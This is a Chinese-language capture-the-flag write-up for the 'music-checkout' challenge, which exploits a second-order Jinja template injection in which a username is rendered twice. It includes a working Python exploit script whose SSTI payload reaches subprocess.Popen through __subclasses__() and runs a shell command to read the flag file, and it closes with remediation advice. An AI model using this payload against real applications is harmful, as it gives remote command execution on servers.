# music-checkout

## 题目简述

应用接收 `username` 与歌曲文本，先用 Jinja 渲染 `playlist.html`，再把渲染结果保存到 `templates/uploads/<uuid>.html`。访问分享链接时，它又对这个已生成文件执行一次 `render_template`。这是二次渲染 SSTI：第一次作为普通变量插入的用户名，可以在第二次成为 Jinja 表达式。

## 解题过程

过滤器只检查歌曲字段 `text` 是否含 `{{` 或 `}}`，完全没有检查 `username`：

```python
if "{{" in text or "}}" in text:
    return "Nice try!", 406
filled = render_template("playlist.html", username=username, songs=text)
open(f"templates/uploads/{uuid}.html", "w").write(filled)
```

模板又对用户名使用 `{{ username|safe }}`，所以第一次渲染后，攻击字符串原样写入上传模板。第二次访问 `/view_playlist/<uuid>` 时，Jinja 才执行其中的表达式。

官方环境可从 Python 对象继承树定位 `subprocess.Popen`，执行 `cat flag.txt`：

```python
import requests

payload = "{{'abc'.__class__.__base__.__subclasses__()[336]" \
          "('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}"

response = requests.post(
    "https://TARGET/create_playlist",
    data={"text": "", "username": payload},
)
path = response.text.split('href="', 1)[1].split('"', 1)[0]
page = requests.get("https://TARGET" + path).text
start = page.index("tjctf{")
print(page[start:page.index("}", start) + 1])
```

`__subclasses__()` 的索引依赖 Python 版本与已导入模块；本题 Docker 环境固定，所以官方索引 336 可复现。输出为：

```text
tjctf{such_quirky_taste_818602f2}
```

## 方法总结

- 数据第一次进入模板时可能只是文本，但若生成结果后来再次被模板引擎解析，就会产生二次 SSTI。
- 过滤单一字段无效：危险载荷位于 `username`，而 `text` 的花括号黑名单没有覆盖真实数据流。
- 修复方法是把用户生成页面作为静态内容返回，或只保存结构化数据并始终让模板引擎对用户字段自动转义，绝不能把渲染结果再次当模板加载。
